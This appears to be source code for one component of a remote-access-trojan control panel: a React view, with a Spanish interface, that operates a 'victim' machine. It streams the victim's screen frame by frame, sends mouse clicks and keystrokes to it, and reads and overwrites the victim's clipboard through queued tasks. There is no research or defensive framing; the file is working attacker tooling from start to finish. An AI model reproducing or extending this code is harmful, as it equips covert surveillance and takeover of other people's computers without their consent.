'use client';
import { useCallback, useEffect, useRef, useState } from 'react';
import { ClipboardPaste, Maximize, Monitor, Pause, Play, RefreshCw } from 'lucide-react';
import { mutate } from '@/hooks/useApi';
import { api } from '@/lib/api';
import type { Task, Victim } from '@/lib/types';
import { Badge } from '@/components/ui/badge';
import { Button } from '@/components/ui/button';
import { humanError } from '@/lib/errors';
import { toast } from 'sonner';

type Screen = { index: number; width: number; height: number; primary: boolean };

export function RemoteDesktop({ victim }: { victim: Victim }) {
  const [quality, setQuality] = useState(55);
  const [scale, setScale] = useState(1280);
  const [fps, setFps] = useState(8);
  const [screen, setScreen] = useState(0);
  const [playing, setPlaying] = useState(false);
  const [image, setImage] = useState<{ data: string; width: number; height: number } | null>(null);
  const [latency, setLatency] = useState<number | null>(null);
  const [error, setError] = useState<string | null>(null);
  const [screens, setScreens] = useState<Screen[]>([]);
  const [clipboardSync, setClipboardSync] = useState(false);
  const box = useRef<HTMLDivElement | null>(null);
  const playingRef = useRef(false);
  const busy = useRef(false);
  const lastMove = useRef(0);

  const grab = useCallback(async () => {
    if (!playingRef.current || busy.current) return;
    busy.current = true;
    const started = Date.now();
    try {
      const created = await mutate<{ items: Array<{ id: string }> }>('/tasks', 'POST', {
        victim_ids: [victim.id], name: 'desktop:frame', params: { quality, scale, screen }, timeout_sec: 10
      });
      const id = created.items[0]?.id;
      if (!id) throw new Error('sin tarea');
      for (let tries = 0; tries < 80; tries += 1) {
        const list = await api<{ items: Task[] }>(`/tasks?victim=${victim.id}&name=desktop:frame&limit=5`);
        const task = list.items.find((item) => item.id === id);
        if (task?.status === 'done' && task.result) {
          const result = task.result as { data?: string; width?: number; height?: number };
          if (result.data) {
            setImage({ data: result.data, width: result.width ?? 0, height: result.height ?? 0 });
            setLatency(Date.now() - started);
            setError(null);
          }
          break;
        }
        if (task?.status === 'error') { setError(task.error ?? 'frame_error'); break; }
        await new Promise((resolve) => setTimeout(resolve, 80));
      }
    } catch (caught) {
      setError(humanError(caught));
      playingRef.current = false;
      setPlaying(false);
    } finally {
      busy.current = false;
    }
  }, [victim.id, quality, scale, screen]);

  useEffect(() => {
    if (!playing) return;
    let timer: ReturnType<typeof setTimeout> | null = null;
    const loop = async () => {
      await grab();
      if (playingRef.current) timer = setTimeout(loop, Math.max(60, 1000 / fps));
    };
    void loop();
    return () => { if (timer) clearTimeout(timer); };
  }, [playing, fps, grab]);

  async function start() {
    playingRef.current = true;
    setPlaying(true);
    if (screens.length === 0) {
      try {
        const result = await mutate<{ items: Array<{ id: string }> }>('/tasks', 'POST', { victim_ids: [victim.id], name: 'desktop:screens', params: {}, timeout_sec: 15 });
        const id = result.items[0]?.id;
        if (id) {
          for (let tries = 0; tries < 40; tries += 1) {
            const list = await api<{ items: Task[] }>(`/tasks?victim=${victim.id}&name=desktop:screens&limit=3`);
            const task = list.items.find((item) => item.id === id);
            if (task?.status === 'done') { setScreens((task.result as { screens?: Screen[] } | null)?.screens ?? []); break; }
            if (task?.status === 'error') break;
            await new Promise((resolve) => setTimeout(resolve, 100));
          }
        }
      } catch { /* el stream sigue sin selector */ }
    }
  }

  function stop() {
    playingRef.current = false;
    setPlaying(false);
  }

  function point(event: React.MouseEvent) {
    const node = box.current;
    if (!node) return { x: 0, y: 0 };
    const rect = node.getBoundingClientRect();
    return {
      x: Math.round(Math.max(0, Math.min(1, (event.clientX - rect.left) / rect.width)) * 10000),
      y: Math.round(Math.max(0, Math.min(1, (event.clientY - rect.top) / rect.height)) * 10000)
    };
  }

  function send(name: string, params: Record<string, unknown>) {
    void mutate('/tasks', 'POST', { victim_ids: [victim.id], name, params, timeout_sec: 10 }).catch(() => undefined);
  }

  function onMove(event: React.MouseEvent) {
    const now = Date.now();
    if (now - lastMove.current < 55) return;
    lastMove.current = now;
    send('input:mouse', { action: 'move', ...point(event), screen });
  }

  function onWheel(event: React.WheelEvent) {
    send('input:mouse', { action: 'wheel', ...point(event), screen, delta: event.deltaY > 0 ? 1 : -1 });
  }

  const SPECIAL: Record<string, number> = { Enter: 10, Tab: 9, Escape: 27, Backspace: 8, Delete: 127, ' ': 32, ArrowUp: 38, ArrowDown: 40, ArrowLeft: 37, ArrowRight: 39, Control: 17, Shift: 16, Alt: 18 };
  function onKey(event: React.KeyboardEvent, action: 'down' | 'up') {
    const vk = SPECIAL[event.key] ?? (event.key.length === 1 ? event.key.toUpperCase().charCodeAt(0) : 0);
    if (!vk) return;
    event.preventDefault();
    const modifiers = [event.ctrlKey && 'ctrl', event.shiftKey && 'shift', event.altKey && 'alt', event.metaKey && 'meta'].filter(Boolean) as string[];
    send('input:key', { action, vk, key: event.key.length === 1 ? event.key : '', modifiers });
  }

  async function syncClipboard() {
    try {
      if (clipboardSync) {
        await mutate('/tasks', 'POST', { victim_ids: [victim.id], name: 'clipboard:get', params: {}, timeout_sec: 20 });
      } else {
        const text = await navigator.clipboard.readText();
        await mutate('/tasks', 'POST', { victim_ids: [victim.id], name: 'clip_set', params: { text: text.slice(0, 128) }, timeout_sec: 20 });
        toast.success('Portapapeles enviado a la víctima');
      }
    } catch (caught) {
      toast.error(humanError(caught));
    }
  }

  return (
    <section className="xp-card rounded-lg border border-line bg-panel/30 p-2" aria-label="Escritorio remoto">
      <div className="flex flex-wrap items-center gap-1.5">
        <Monitor className="h-3.5 w-3.5 text-muted" />
        <p className="text-2xs uppercase tracking-wide text-muted">Escritorio remoto</p>
        {playing ? <Badge tone="ok">live</Badge> : null}
        {latency != null ? <Badge tone={latency < 300 ? 'ok' : 'warn'}>{latency} ms</Badge> : null}
        <div className="ml-auto flex flex-wrap items-center gap-1">
          <label className="flex items-center gap-1 text-2xs text-muted">calidad <input type="range" min={20} max={90} value={quality} onChange={(event) => setQuality(Number(event.target.value))} className="w-16" /></label>
          <select value={scale} onChange={(event) => setScale(Number(event.target.value))} className="h-6 rounded border border-line bg-bg px-1 text-2xs" aria-label="Escalado">
            {[640, 960, 1280, 1600, 1920].map((value) => <option key={value} value={value}>{value}px</option>)}
          </select>
          <select value={fps} onChange={(event) => setFps(Number(event.target.value))} className="h-6 rounded border border-line bg-bg px-1 text-2xs" aria-label="FPS">
            {[2, 5, 8, 10, 12, 15].map((value) => <option key={value} value={value}>{value} fps</option>)}
          </select>
          {screens.length > 1 ? (
            <select value={screen} onChange={(event) => setScreen(Number(event.target.value))} className="h-6 rounded border border-line bg-bg px-1 text-2xs" aria-label="Pantalla">
              {screens.map((item) => <option key={item.index} value={item.index}>pantalla {item.index + 1} ({item.width}×{item.height})</option>)}
            </select>
          ) : null}
          <Button size="icon" variant="ghost" title="Ajustar a ventana" aria-label="Ajustar a ventana" onClick={() => void box.current?.requestFullscreen?.()}><Maximize className="h-3 w-3" /></Button>
          <Button size="icon" variant="ghost" title="Sincronizar portapapeles" aria-label="Sincronizar portapapeles" onClick={() => { setClipboardSync((value) => !value); void syncClipboard(); }}><ClipboardPaste className={clipboardSync ? 'h-3 w-3 text-brand' : 'h-3 w-3'} /></Button>
          {playing ? <Button size="sm" variant="destructive" onClick={stop}><Pause className="h-3 w-3" /> pausa</Button> : <Button size="sm" disabled={!victim.socket} onClick={() => void start()}><Play className="h-3 w-3" /> ver</Button>}
        </div>
      </div>

      {error ? <p className="mt-1 rounded border border-bad/30 bg-bad/10 px-2 py-1 text-2xs text-bad" data-desktop-error>{error}</p> : null}
      <div
        ref={box}
        tabIndex={0}
        role="application"
        aria-label="Escritorio de la víctima"
        className="mt-1.5 min-h-[200px] overflow-hidden rounded border border-line bg-black/50 outline-none focus:ring-1 focus:ring-brand"
        onMouseMove={onMove}
        onClick={(event) => send('input:mouse', { action: 'click', ...point(event), screen })}
        onDoubleClick={(event) => send('input:mouse', { action: 'double', ...point(event), screen })}
        onContextMenu={(event) => { event.preventDefault(); send('input:mouse', { action: 'right', ...point(event), screen }); }}
        onWheel={onWheel}
        onKeyDown={(event) => onKey(event, 'down')}
        onKeyUp={(event) => onKey(event, 'up')}
      >
        {image ? <img src={`data:image/jpeg;base64,${image.data}`} alt="escritorio" draggable={false} className="w-full select-none" data-desktop-frame /> : (
          <p className="grid min-h-[200px] place-items-center text-2xs text-muted">{playing ? 'Pidiendo el primer fotograma…' : 'Pulsa ver para abrir el escritorio. Clic y teclado se reenvían.'}</p>
        )}
      </div>
      {image ? <p className="mt-1 text-2xs text-muted/70">{image.width}×{image.height} · {fps} fps objetivo · pantalla {screen + 1} · portapapeles {clipboardSync ? 'panel→víctima' : 'manual'}</p> : null}
      {!victim.socket ? <p className="mt-1 text-2xs text-warn">Sin socket de control.</p> : null}
      <p className="mt-1 text-2xs text-muted/70">Fotograma a fotograma sobre el canal actual (sin WebRTC): la entrada se envía como tareas input:mouse / input:key.</p>
      <p className="hidden"><RefreshCw /></p>
    </section>
  );
}
